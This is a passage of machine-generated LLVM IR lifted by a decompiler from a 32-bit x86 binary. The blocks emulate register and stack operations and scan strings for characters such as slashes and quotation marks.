  %v1_8049d93 = add i32 %v0_8049d93, 20900
  %v2_8049d93 = inttoptr i32 %v1_8049d93 to i32*
  store i32 8, i32* %v2_8049d93, align 4
  br label %dec_label_pc_8049b32

dec_label_pc_8049da3:                             ; preds = %dec_label_pc_804965f
  %v9_8049da3 = icmp eq i32 %v0_80496b5, 12
  store i1 %v9_8049da3, i1* %zf.global-to-local, align 1
  %v0_8049da6 = load i32, i32* @edi, align 4
  %v2_8049da6 = add i32 %v0_80496b5, -16
  %v3_8049da6 = inttoptr i32 %v2_8049da6 to i32*
  store i32 %v0_8049da6, i32* %v3_8049da6, align 4
  %v2_8049da7 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049da7, i32* %eax.global-to-local, align 4
  %v0_8049dac = load i32, i32* @esp, align 4
  %v1_8049dac = add i32 %v0_8049dac, 16
  %v1_8049daf = add i32 %v2_8049da7, -127
  %v6_8049daf = sub i32 126, %v2_8049da7
  %v7_8049daf = and i32 %v6_8049daf, %v2_8049da7
  %v8_8049daf = icmp slt i32 %v7_8049daf, 0
  %v9_8049daf = icmp eq i32 %v1_8049daf, 0
  store i1 %v9_8049daf, i1* %zf.global-to-local, align 1
  %v10_8049daf = icmp slt i32 %v1_8049daf, 0
  %v3_8049db2 = icmp eq i1 %v10_8049daf, %v8_8049daf
  %v4_8049db2 = icmp eq i1 %v9_8049daf, false
  %v5_8049db2 = and i1 %v4_8049db2, %v3_8049db2
  br i1 %v5_8049db2, label %dec_label_pc_80496c3, label %dec_label_pc_8049db8

dec_label_pc_8049db8:                             ; preds = %dec_label_pc_8049da3
  %v2_8049db8 = add i32 %v0_8049dac, 12
  %v3_8049db8 = inttoptr i32 %v2_8049db8 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db8, align 4
  %v2_8049db9 = add i32 %v0_8049dac, 8
  %v3_8049db9 = inttoptr i32 %v2_8049db9 to i32*
  store i32 %v2_8049da7, i32* %v3_8049db9, align 4
  %v0_8049dba = load i32, i32* @edi, align 4
  %v2_8049dba = add i32 %v0_8049dac, 4
  %v3_8049dba = inttoptr i32 %v2_8049dba to i32*
  store i32 %v0_8049dba, i32* %v3_8049dba, align 4
  %v1_8049dbb = add i32 %v0_8049dac, 108
  %v2_8049dbb = inttoptr i32 %v1_8049dbb to i32*
  %v3_8049dbb = load i32, i32* %v2_8049dbb, align 4
  store i32 %v3_8049dbb, i32* %edx.global-to-local, align 4
  %v1_8049dbf = add i32 %v3_8049dbb, 16
  %v2_8049dbf = inttoptr i32 %v1_8049dbf to i32*
  %v3_8049dbf = load i32, i32* %v2_8049dbf, align 4
  %v2_8049dc2 = mul i32 %v3_8049dbf, 128
  %v3_8049dc2 = icmp eq i32 %v2_8049dc2, 0
  store i1 %v3_8049dc2, i1* %zf.global-to-local, align 1
  %v0_8049dc5 = load i32, i32* @ebp, align 4
  %v2_8049dc5 = add i32 %v0_8049dc5, %v2_8049dc2
  store i32 %v2_8049dc5, i32* %eax.global-to-local, align 4
  %v3_8049dc9 = inttoptr i32 %v0_8049dac to i32*
  store i32 %v2_8049dc5, i32* %v3_8049dc9, align 4
  %v3_8049dca = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049dca, i32* %eax.global-to-local, align 4
  %v0_8049dcf = load i32, i32* @esp, align 4
  %v1_8049dcf = add i32 %v0_8049dcf, 108
  %v2_8049dcf = inttoptr i32 %v1_8049dcf to i32*
  %v3_8049dcf = load i32, i32* %v2_8049dcf, align 4
  store i32 %v3_8049dcf, i32* %ecx.global-to-local, align 4
  %v1_8049dd3 = add i32 %v3_8049dcf, 16
  %v2_8049dd3 = inttoptr i32 %v1_8049dd3 to i32*
  %v3_8049dd3 = load i32, i32* %v2_8049dd3, align 4
  %v2_8049dd6 = mul i32 %v3_8049dd3, 128
  %v3_8049dd6 = icmp eq i32 %v2_8049dd6, 0
  store i1 %v3_8049dd6, i1* %zf.global-to-local, align 1
  %v0_8049dd9 = load i32, i32* @ebp, align 4
  %v2_8049dd9 = add i32 %v0_8049dd9, %v2_8049dd6
  store i32 %v2_8049dd9, i32* %ebx.global-to-local, align 4
  %v2_8049ddd = inttoptr i32 %v0_8049dcf to i32*
  store i32 %v2_8049dd9, i32* %v2_8049ddd, align 4
  %v2_8049de0 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049de0, i32* %eax.global-to-local, align 4
  %v0_8049de5 = load i32, i32* @esp, align 4
  %v1_8049de5 = inttoptr i32 %v0_8049de5 to i32*
  %v2_8049de5 = load i32, i32* %v1_8049de5, align 4
  store i32 %v2_8049de5, i32* %ecx.global-to-local, align 4
  %v3_8049de5 = add i32 %v0_8049de5, 4
  %v0_8049de6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049de6 = add i32 %v0_8049de6, %v2_8049de0
  %v12_8049de6 = icmp eq i32 %v2_8049de6, 0
  store i1 %v12_8049de6, i1* %zf.global-to-local, align 1
  store i32 %v2_8049de6, i32* @ebx, align 4
  %v1_8049de8 = inttoptr i32 %v3_8049de5 to i32*
  store i32 ptrtoint (i32* @global_var_8054ad3.19 to i32), i32* %v1_8049de8, align 4
  %v0_8049dee = load i32, i32* @ebx, align 4
  store i32 %v0_8049dee, i32* %v1_8049de5, align 4
  %v3_8049def = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049def, i32* %eax.global-to-local, align 4
  %v0_8049df4 = load i32, i32* @esp, align 4
  %v1_8049df4 = add i32 %v0_8049df4, 56
  %v2_8049df4 = inttoptr i32 %v1_8049df4 to i32*
  %v3_8049df4 = load i32, i32* %v2_8049df4, align 4
  store i32 %v3_8049df4, i32* %ebx.global-to-local, align 4
  %v1_8049df8 = add i32 %v0_8049df4, -4
  %v2_8049df8 = inttoptr i32 %v1_8049df8 to i32*
  store i32 1, i32* %v2_8049df8, align 4
  %v1_8049dfa = add i32 %v0_8049df4, -8
  %v2_8049dfa = inttoptr i32 %v1_8049dfa to i32*
  store i32 ptrtoint (i32* @global_var_8054ada.16 to i32), i32* %v2_8049dfa, align 4
  %v1_8049dff = add i32 %v0_8049df4, 108
  %v2_8049dff = inttoptr i32 %v1_8049dff to i32*
  %v3_8049dff = load i32, i32* %v2_8049dff, align 4
  store i32 %v3_8049dff, i32* %edx.global-to-local, align 4
  %v0_8049e03 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049e03 = add i32 %v0_8049e03, 3
  store i32 %v1_8049e03, i32* @ebx, align 4
  %v0_8049e06 = load i32, i32* @esi, align 4
  %v2_8049e06 = add i32 %v0_8049e06, %v1_8049e03
  store i32 %v2_8049e06, i32* @esi, align 4
  %v1_8049e08 = add i32 %v3_8049dff, 660
  %v2_8049e08 = inttoptr i32 %v1_8049e08 to i32*
  %v3_8049e08 = load i32, i32* %v2_8049e08, align 4
  %v2_8049e0e = sub i32 %v3_8049e08, %v1_8049e03
  %v12_8049e0e = icmp eq i32 %v2_8049e0e, 0
  store i1 %v12_8049e0e, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e0e, i32* %eax.global-to-local, align 4
  %v2_8049e10 = add i32 %v0_8049df4, -12
  %v3_8049e10 = inttoptr i32 %v2_8049e10 to i32*
  store i32 %v2_8049e0e, i32* %v3_8049e10, align 4
  %v0_8049e11 = load i32, i32* @esi, align 4
  %v2_8049e11 = add i32 %v0_8049df4, -16
  %v3_8049e11 = inttoptr i32 %v2_8049e11 to i32*
  store i32 %v0_8049e11, i32* %v3_8049e11, align 4
  %v0_8049e12 = call i32 @function_8051ca0()
  store i32 %v0_8049e12, i32* %eax.global-to-local, align 4
  %v0_8049e17 = load i32, i32* @esp, align 4
  %v1_8049e17 = add i32 %v0_8049e17, 108
  %v2_8049e17 = inttoptr i32 %v1_8049e17 to i32*
  %v3_8049e17 = load i32, i32* %v2_8049e17, align 4
  store i32 %v3_8049e17, i32* %edx.global-to-local, align 4
  %v0_8049e1b = load i32, i32* @ebx, align 4
  %v2_8049e1b = add i32 %v0_8049e1b, %v3_8049e17
  store i32 %v2_8049e1b, i32* %ebx.global-to-local, align 4
  %v2_8049e1d = add i32 %v0_8049e12, 2115
  %v3_8049e1d = add i32 %v2_8049e1d, %v2_8049e1b
  %v4_8049e1d = inttoptr i32 %v3_8049e1d to i8*
  store i8 0, i8* %v4_8049e1d, align 1
  %v0_8049e25 = load i32, i32* @esp, align 4
  %v1_8049e25 = add i32 %v0_8049e25, 124
  %v2_8049e25 = inttoptr i32 %v1_8049e25 to i32*
  %v3_8049e25 = load i32, i32* %v2_8049e25, align 4
  store i32 %v3_8049e25, i32* %ecx.global-to-local, align 4
  %v1_8049e2c = add i32 %v3_8049e25, 16
  %v2_8049e2c = inttoptr i32 %v1_8049e2c to i32*
  %v3_8049e2c = load i32, i32* %v2_8049e2c, align 4
  %v2_8049e2f = mul i32 %v3_8049e2c, 128
  %v3_8049e2f = icmp eq i32 %v2_8049e2f, 0
  store i1 %v3_8049e2f, i1* %zf.global-to-local, align 1
  %v0_8049e32 = load i32, i32* @ebp, align 4
  %v2_8049e32 = add i32 %v0_8049e32, %v2_8049e2f
  store i32 %v2_8049e32, i32* %ebx.global-to-local, align 4
  %v2_8049e36 = add i32 %v0_8049e25, 16
  %v3_8049e36 = inttoptr i32 %v2_8049e36 to i32*
  store i32 %v2_8049e32, i32* %v3_8049e36, align 4
  %v2_8049e37 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049e37, i32* %eax.global-to-local, align 4
  %v0_8049e3c = load i32, i32* @esp, align 4
  %v1_8049e3c = inttoptr i32 %v0_8049e3c to i32*
  %v2_8049e3c = load i32, i32* %v1_8049e3c, align 4
  store i32 %v2_8049e3c, i32* %ecx.global-to-local, align 4
  %v3_8049e3c = add i32 %v0_8049e3c, 4
  %v0_8049e3d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049e3d = add i32 %v0_8049e3d, %v2_8049e37
  %v12_8049e3d = icmp eq i32 %v2_8049e3d, 0
  store i1 %v12_8049e3d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e3d, i32* @ebx, align 4
  %v1_8049e3f = inttoptr i32 %v3_8049e3c to i32*
  %v2_8049e3f = load i32, i32* %v1_8049e3f, align 4
  store i32 %v2_8049e3f, i32* @edi, align 4
  %v0_8049e40 = load i32, i32* @esi, align 4
  store i32 %v0_8049e40, i32* %v1_8049e3f, align 4
  %v0_8049e41 = load i32, i32* @ebx, align 4
  store i32 %v0_8049e41, i32* %v1_8049e3c, align 4
  %v3_8049e42 = call i32 @function_8051c10(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049e42, i32* %eax.global-to-local, align 4
  %v0_8049e47 = load i32, i32* @esp, align 4
  %v1_8049e47 = add i32 %v0_8049e47, 108
  %v2_8049e47 = inttoptr i32 %v1_8049e47 to i32*
  %v3_8049e47 = load i32, i32* %v2_8049e47, align 4
  store i32 %v3_8049e47, i32* %eax.global-to-local, align 4
  %v1_8049e4b = add i32 %v3_8049e47, 16
  %v2_8049e4b = inttoptr i32 %v1_8049e4b to i32*
  %v3_8049e4b = load i32, i32* %v2_8049e4b, align 4
  %v1_8049e51 = add i32 %v3_8049e4b, 1
  %v8_8049e51 = icmp eq i32 %v1_8049e51, 0
  store i1 %v8_8049e51, i1* %zf.global-to-local, align 1
  store i32 %v1_8049e51, i32* %edx.global-to-local, align 4
  store i32 %v1_8049e51, i32* %v2_8049e4b, align 4
  %v0_80496c3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80496c3

dec_label_pc_8049e5a:                             ; preds = %dec_label_pc_804974f
  store i32 %v3_8049e5a, i32* %eax.global-to-local, align 4
  %v1_8049e5e = add i32 %v3_8049e5a, -1448
  %v2_8049e5e = inttoptr i32 %v1_8049e5e to i8*
  store i8 1, i8* %v2_8049e5e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049e6a:                             ; preds = %dec_label_pc_8049a11
  %v1_8049e6a = add i32 %v0_8049a34, 20916
  %v2_8049e6a = inttoptr i32 %v1_8049e6a to i32*
  store i32 7, i32* %v2_8049e6a, align 4
  %v0_8049e75 = load i32, i32* @ebx, align 4
  %v1_8049e75 = add i32 %v0_8049e75, 4
  %v2_8049e75 = inttoptr i32 %v1_8049e75 to i8*
  %v3_8049e75 = load i8, i8* %v2_8049e75, align 1
  %v12_8049e75 = icmp eq i8 %v3_8049e75, 115
  store i1 %v12_8049e75, i1* %zf.global-to-local, align 1
  %v1_8049e79 = icmp eq i1 %v12_8049e75, false
  br i1 %v1_8049e79, label %dec_label_pc_8049e86, label %dec_label_pc_8049e7b

dec_label_pc_8049e7b:                             ; preds = %dec_label_pc_8049e6a
  %v0_8049e7b = load i32, i32* @esp, align 4
  %v1_8049e7b = add i32 %v0_8049e7b, 20900
  %v2_8049e7b = inttoptr i32 %v1_8049e7b to i32*
  store i32 8, i32* %v2_8049e7b, align 4
  br label %dec_label_pc_8049e86

dec_label_pc_8049e86:                             ; preds = %dec_label_pc_8049e6a, %dec_label_pc_8049e7b
  %v0_8049e86 = load i32, i32* @esp, align 4
  %v1_8049e86 = add i32 %v0_8049e86, 20900
  %v2_8049e86 = inttoptr i32 %v1_8049e86 to i32*
  %v3_8049e86 = load i32, i32* %v2_8049e86, align 4
  store i32 %v3_8049e86, i32* %edx.global-to-local, align 4
  %v2_8049e8d = add i32 %v0_8049e86, -4
  %v3_8049e8d = inttoptr i32 %v2_8049e8d to i32*
  store i32 4, i32* %v3_8049e8d, align 4
  %v0_8049e8e = load i32, i32* @edi, align 4
  %v1_8049e8e = add i32 %v0_8049e8e, 1
  %v1_8049e91 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e91 = sub i32 %v1_8049e8e, %v1_8049e91
  %v12_8049e91 = icmp eq i32 %v2_8049e91, 0
  store i1 %v12_8049e91, i1* %zf.global-to-local, align 1
  store i32 %v2_8049e91, i32* %eax.global-to-local, align 4
  %v0_8049e93 = load i32, i32* @ebx, align 4
  %v2_8049e93 = add i32 %v0_8049e93, %v1_8049e91
  store i32 %v2_8049e93, i32* %edx.global-to-local, align 4
  %v2_8049e96 = add i32 %v0_8049e86, -8
  %v3_8049e96 = inttoptr i32 %v2_8049e96 to i32*
  store i32 %v2_8049e91, i32* %v3_8049e96, align 4
  %v0_8049e97 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049e97 = add i32 %v0_8049e86, -12
  %v3_8049e97 = inttoptr i32 %v2_8049e97 to i32*
  store i32 %v0_8049e97, i32* %v3_8049e97, align 4
  %v0_8049e98 = load i32, i32* @ebx, align 4
  %v2_8049e98 = add i32 %v0_8049e86, -16
  %v3_8049e98 = inttoptr i32 %v2_8049e98 to i32*
  store i32 %v0_8049e98, i32* %v3_8049e98, align 4
  %v4_8049e99 = call i32 @function_80526f3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049e99, i32* %eax.global-to-local, align 4
  %v0_8049e9e = load i32, i32* @esp, align 4
  %v1_8049e9e = add i32 %v0_8049e9e, 20916
  %v2_8049e9e = inttoptr i32 %v1_8049e9e to i32*
  store i32 0, i32* %v2_8049e9e, align 4
  %v0_8049ea9 = load i32, i32* @esp, align 4
  %v6_8049ea9 = icmp eq i32 %v0_8049ea9, -16
  store i1 %v6_8049ea9, i1* %zf.global-to-local, align 1
  %v0_8049eac = load i32, i32* @ebx, align 4
  %v1_8049eac = inttoptr i32 %v0_8049eac to i8*
  %v2_8049eac = load i8, i8* %v1_8049eac, align 1
  %v3_8049eac = zext i8 %v2_8049eac to i32
  %v5_8049eac = and i32 %v4_8049e99, -256
  %v6_8049eac = or i32 %v3_8049eac, %v5_8049eac
  store i32 %v6_8049eac, i32* %eax.global-to-local, align 4
  %v4_8049eae = icmp eq i8 %v2_8049eac, 0
  store i1 %v4_8049eae, i1* %zf.global-to-local, align 1
  br i1 %v4_8049eae, label %dec_label_pc_8049ce8, label %dec_label_pc_8049eb6

dec_label_pc_8049eb6:                             ; preds = %dec_label_pc_8049e86
  store i32 %v0_8049eac, i32* %ecx.global-to-local, align 4
  %v10_8049eb8 = icmp eq i8 %v2_8049eac, 47
  store i1 %v10_8049eb8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049eb8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec0

dec_label_pc_8049ec0:                             ; preds = %dec_label_pc_8049eb6
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049ed1195 = add i32 %v0_8049eac, 1
  store i32 %v2_8049ed1195, i32* %ecx.global-to-local, align 4
  %v2_8049ed4196 = add i32 %v0_8049ea9, 20916
  %v3_8049ed4197 = inttoptr i32 %v2_8049ed4196 to i32*
  store i32 1, i32* %v3_8049ed4197, align 4
  %v0_8049edb198 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb199 = inttoptr i32 %v0_8049edb198 to i8*
  %v2_8049edb200 = load i8, i8* %v1_8049edb199, align 1
  %v3_8049edb201 = zext i8 %v2_8049edb200 to i32
  %v4_8049edb202 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb203 = and i32 %v4_8049edb202, -256
  %v6_8049edb204 = or i32 %v5_8049edb203, %v3_8049edb201
  store i32 %v6_8049edb204, i32* %edx.global-to-local, align 4
  %v4_8049edd205 = icmp eq i8 %v2_8049edb200, 0
  store i1 %v4_8049edd205, i1* %zf.global-to-local, align 1
  %v1_8049edf206 = icmp eq i1 %v4_8049edd205, false
  br i1 %v1_8049edf206, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ec7:                             ; preds = %dec_label_pc_8049ec0, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge
  %v2_8049edb208 = phi i8 [ %v2_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v2_8049edb200, %dec_label_pc_8049ec0 ]
  %v0_8049edb207 = phi i32 [ %v0_8049edb, %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge ], [ %v0_8049edb198, %dec_label_pc_8049ec0 ]
  %v0_8049ec7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049ec7 = add i32 %v0_8049ec7, 1
  store i32 %v1_8049ec7, i32* %eax.global-to-local, align 4
  %v10_8049ec8 = icmp eq i8 %v2_8049edb208, 47
  store i1 %v10_8049ec8, i1* %zf.global-to-local, align 1
  br i1 %v10_8049ec8, label %dec_label_pc_8049ce5, label %dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge

dec_label_pc_8049ec7.dec_label_pc_8049ed1_crit_edge: ; preds = %dec_label_pc_8049ec7
  %v0_8049ed1.pre = load i32, i32* @ebx, align 4
  %v1_8049ed4.pre = load i32, i32* @esp, align 4
  %v2_8049ed1 = add i32 %v0_8049ed1.pre, %v1_8049ec7
  store i32 %v2_8049ed1, i32* %ecx.global-to-local, align 4
  %v2_8049ed4 = add i32 %v1_8049ed4.pre, 20900
  %v3_8049ed4 = inttoptr i32 %v2_8049ed4 to i32*
  store i32 %v1_8049ec7, i32* %v3_8049ed4, align 4
  %v0_8049edb = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049edb = inttoptr i32 %v0_8049edb to i8*
  %v2_8049edb = load i8, i8* %v1_8049edb, align 1
  %v3_8049edb = zext i8 %v2_8049edb to i32
  %v4_8049edb = load i32, i32* %edx.global-to-local, align 4
  %v5_8049edb = and i32 %v4_8049edb, -256
  %v6_8049edb = or i32 %v5_8049edb, %v3_8049edb
  store i32 %v6_8049edb, i32* %edx.global-to-local, align 4
  %v4_8049edd = icmp eq i8 %v2_8049edb, 0
  store i1 %v4_8049edd, i1* %zf.global-to-local, align 1
  %v1_8049edf = icmp eq i1 %v4_8049edd, false
  br i1 %v1_8049edf, label %dec_label_pc_8049ec7, label %dec_label_pc_8049ce8

dec_label_pc_8049ee6:                             ; preds = %dec_label_pc_8049930
  %v0_8049ee6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049ee6 = add i32 %v0_8049ee6, 2
  store i32 %v1_8049ee6, i32* %eax.global-to-local, align 4
  %v1_8049ee9 = load i32, i32* @esp, align 4
  %v2_8049ee9 = add i32 %v1_8049ee9, 20900
  %v3_8049ee9 = inttoptr i32 %v2_8049ee9 to i32*
  store i32 %v1_8049ee6, i32* %v3_8049ee9, align 4
  %v0_8049951.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804994e

dec_label_pc_8049ef5:                             ; preds = %dec_label_pc_80499c3
  %v1_8049ef5 = add i32 %v3_80499c3, 1
  store i32 %v1_8049ef5, i32* %ebx.global-to-local, align 4
  store i32 %v1_8049ef5, i32* %v2_80499c3, align 4
  %v0_8049eff = load i32, i32* @esp, align 4
  %v9_8049eff = icmp eq i32 %v0_8049eff, 12
  store i1 %v9_8049eff, i1* %zf.global-to-local, align 1
  %v0_8049f02 = load i32, i32* @esi, align 4
  %v1_8049f02 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8049f02 = add i32 %v1_8049f02, %v0_8049f02
  store i32 %v2_8049f02, i32* @ebx, align 4
  %v2_8049f05 = add i32 %v0_8049eff, -16
  %v3_8049f05 = inttoptr i32 %v2_8049f05 to i32*
  store i32 %v2_8049f02, i32* %v3_8049f05, align 4
  %v2_8049f06 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049f06, i32* %eax.global-to-local, align 4
  %v0_8049f0b = load i32, i32* @esp, align 4
  %v1_8049f0b = add i32 %v0_8049f0b, 16
  %v6_8049f0b = icmp eq i32 %v1_8049f0b, 0
  store i1 %v6_8049f0b, i1* %zf.global-to-local, align 1
  %v0_8049f0e = load i32, i32* @ebx, align 4
  %v2_8049f0e = add i32 %v2_8049f06, -1
  %v3_8049f0e = add i32 %v2_8049f0e, %v0_8049f0e
  %v4_8049f0e = inttoptr i32 %v3_8049f0e to i8*
  %v5_8049f0e = load i8, i8* %v4_8049f0e, align 1
  %v14_8049f0e = icmp eq i8 %v5_8049f0e, 34
  store i1 %v14_8049f0e, i1* %zf.global-to-local, align 1
  %v1_8049f13 = icmp eq i1 %v14_8049f0e, false
  br i1 %v1_8049f13, label %dec_label_pc_80499d4, label %dec_label_pc_8049f19

dec_label_pc_8049f19:                             ; preds = %dec_label_pc_8049ef5
  %v1_8049f19 = add i32 %v0_8049f0b, 20916
  %v2_8049f19 = inttoptr i32 %v1_8049f19 to i32*
  %v3_8049f19 = load i32, i32* %v2_8049f19, align 4
  store i32 %v3_8049f19, i32* %eax.global-to-local, align 4
  %v0_8049f20 = load i32, i32* @esi, align 4
  %v2_8049f25 = add i32 %v0_8049f20, %v3_8049f19
  %v12_8049f25 = icmp eq i32 %v2_8049f25, 0
  store i1 %v12_8049f25, i1* %zf.global-to-local, align 1
  store i32 %v2_8049f25, i32* @ebx, align 4
  %v3_8049f27 = inttoptr i32 %v0_8049f0b to i32*
  store i32 %v2_8049f25, i32* %v3_8049f27, align 4
  %v2_8049f28 = call i32 @function_8051bf0(i8* %v1_8048752)
  store i32 %v2_8049f28, i32* %eax.global-to-local, align 4
  %v0_8049f2d = load i32, i32* @esp, align 4
  %v6_8049f2d = icmp eq i32 %v0_8049f2d, -16
  store i1 %v6_8049f2d, i1* %zf.global-to-local, align 1
  %v0_8049f30 = load i32, i32* @ebx, align 4
  %v2_8049f30 = add i32 %v2_8049f28, -1
  %v3_8049f30 = add i32 %v2_8049f30, %v0_8049f30
  %v4_8049f30 = inttoptr i32 %v3_8049f30 to i8*
  store i8 0, i8* %v4_8049f30, align 1
  %v0_80499d4.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80499d4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80499d4

dec_label_pc_8049f3a:                             ; preds = %dec_label_pc_804848a
  %v9_8049f3a = icmp eq i32 %v0_80484a0, 12
  store i1 %v9_8049f3a, i1* %zf.global-to-local, align 1
  %v1_8049f3d = add i32 %v0_80484a0, -16
  %v2_8049f3d = inttoptr i32 %v1_8049f3d to i32*
  store i32 47, i32* %v2_8049f3d, align 4
  %v2_8049f3f = call i32 @function_80512a0(i8 %v1_8049f3f)
  store i32 %v2_8049f3f, i32* %eax.global-to-local, align 4
  %v0_8049f44 = load i32, i32* @esp, align 4
  %v1_8049f44 = inttoptr i32 %v0_8049f44 to i32*
  %v2_8049f44 = load i32, i32* %v1_8049f44, align 4
  store i32 %v2_8049f44, i32* @ebx, align 4
  %v3_8049f44 = add i32 %v0_8049f44, 4
  %v1_8049f45 = inttoptr i32 %v3_8049f44 to i32*
  store i32 0, i32* %v1_8049f45, align 4
  store i32 47, i32* %v1_8049f44, align 4
  %v3_8049f4a = call i32 @function_80511f0(i32 %tmp, i32* nonnull @0)
  store i32 %v3_8049f4a, i32* %eax.global-to-local, align 4
  %v0_8049f4f = load i32, i32* @esp, align 4
  %v1_8049f4f = inttoptr i32 %v0_8049f4f to i32*
  %v2_8049f4f = load i32, i32* %v1_8049f4f, align 4
  store i32 %v2_8049f4f, i32* %edx.global-to-local, align 4
  %v3_8049f4f = add i32 %v0_8049f4f, 4
  %v1_8049f50 = inttoptr i32 %v3_8049f4f to i32*
  %v2_8049f50 = load i32, i32* %v1_8049f50, align 4
  store i32 %v2_8049f50, i32* %ecx.global-to-local, align 4
  store i32 %v3_8049f4a, i32* %v1_8049f50, align 4
  %v0_8049f52 = load i32, i32* @esi, align 4
  %v1_8049f52 = add i32 %v0_8049f52, 20
  store i32 %v1_8049f52, i32* %eax.global-to-local, align 4
  store i32 %v1_8049f52, i32* %v1_8049f4f, align 4
  %v3_8049f56 = call i32 @function_8051c10(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f56, i32* %eax.global-to-local, align 4
  %v0_8049f5b = load i32, i32* @esp, align 4
  %v1_8049f5b = inttoptr i32 %v0_8049f5b to i32*
  store i32 47, i32* %v1_8049f5b, align 4
  %v2_8049f62 = call i32 @function_8051220(i8 %v1_8049f3f)
  store i32 %v2_8049f62, i32* %eax.global-to-local, align 4
  %v0_8049f67 = load i32, i32* @esp, align 4
  %v1_8049f67 = add i32 %v0_8049f67, 16
  %v6_8049f67 = icmp eq i32 %v1_8049f67, 0
  store i1 %v6_8049f67, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049f6a

dec_label_pc_8049f6a:                             ; preds = %dec_label_pc_804848a, %dec_label_pc_804a062, %dec_label_pc_8049ff8, %dec_label_pc_8049fc3, %dec_label_pc_8049f3a
  %v1_8049f6a = phi i32 [ %v0_80484a0, %dec_label_pc_804848a ], [ %v1_804a08f, %dec_label_pc_804a062 ], [ %v1_804a025, %dec_label_pc_8049ff8 ], [ %v1_8049ff0, %dec_label_pc_8049fc3 ], [ %v1_8049f67, %dec_label_pc_8049f3a ]
  %v0_8049f6a = phi i32 [ %v2_80484ac, %dec_label_pc_804848a ], [ %v2_804a08a, %dec_label_pc_804a062 ], [ %v2_804a020, %dec_label_pc_8049ff8 ], [ %v2_8049feb, %dec_label_pc_8049fc3 ], [ %v2_8049f62, %dec_label_pc_8049f3a ]
  %v2_8049f6a = add i32 %v1_8049f6a, -4
  %v3_8049f6a = inttoptr i32 %v2_8049f6a to i32*
  store i32 %v0_8049f6a, i32* %v3_8049f6a, align 4
  %v0_8049f6b = load i32, i32* %eax.global-to-local, align 4
  %v2_8049f6b = add i32 %v1_8049f6a, -8
  %v3_8049f6b = inttoptr i32 %v2_8049f6b to i32*
  store i32 %v0_8049f6b, i32* %v3_8049f6b, align 4
  %v1_8049f6c = add i32 %v1_8049f6a, 64
  %v2_8049f6c = inttoptr i32 %v1_8049f6c to i32*
  %v3_8049f6c = load i32, i32* %v2_8049f6c, align 4
  store i32 %v3_8049f6c, i32* %eax.global-to-local, align 4
  %v0_8049f70 = load i32, i32* @ebp, align 4
  %v1_8049f70 = add i32 %v0_8049f70, 1
  store i32 %v1_8049f70, i32* @ebp, align 4
  %v2_8049f71 = add i32 %v1_8049f6a, -12
  %v3_8049f71 = inttoptr i32 %v2_8049f71 to i32*
  store i32 %v3_8049f6c, i32* %v3_8049f71, align 4
  %v0_8049f72 = load i32, i32* @esi, align 4
  %v1_8049f72 = add i32 %v0_8049f72, 3140
  %v9_8049f72 = icmp eq i32 %v1_8049f72, 0
  store i1 %v9_8049f72, i1* %zf.global-to-local, align 1
  store i32 %v1_8049f72, i32* @esi, align 4
  %v1_8049f78 = add i32 %v1_8049f6a, 36
  %v2_8049f78 = inttoptr i32 %v1_8049f78 to i32*
  %v3_8049f78 = load i32, i32* %v2_8049f78, align 4
  store i32 %v3_8049f78, i32* @edi, align 4
  %v2_8049f7c = add i32 %v1_8049f6a, -16
  %v3_8049f7c = inttoptr i32 %v2_8049f7c to i32*
  store i32 %v3_8049f78, i32* %v3_8049f7c, align 4
  %v3_8049f7d = call i32 @function_8051c10(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049f7d, i32* %eax.global-to-local, align 4
  %v0_8049f82 = load i32, i32* @esp, align 4
  %v1_8049f85 = add i32 %v0_8049f82, 128
  %v2_8049f85 = inttoptr i32 %v1_8049f85 to i32*
  %v3_8049f85 = load i32, i32* %v2_8049f85, align 4
  %v4_8049f85 = load i32, i32* @ebp, align 4
  %v15_8049f85 = icmp eq i32 %v3_8049f85, %v4_8049f85
  store i1 %v15_8049f85, i1* %zf.global-to-local, align 1
  %v1_8049f89 = icmp eq i1 %v15_8049f85, false
  br i1 %v1_8049f89, label %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, label %dec_label_pc_8049f8f

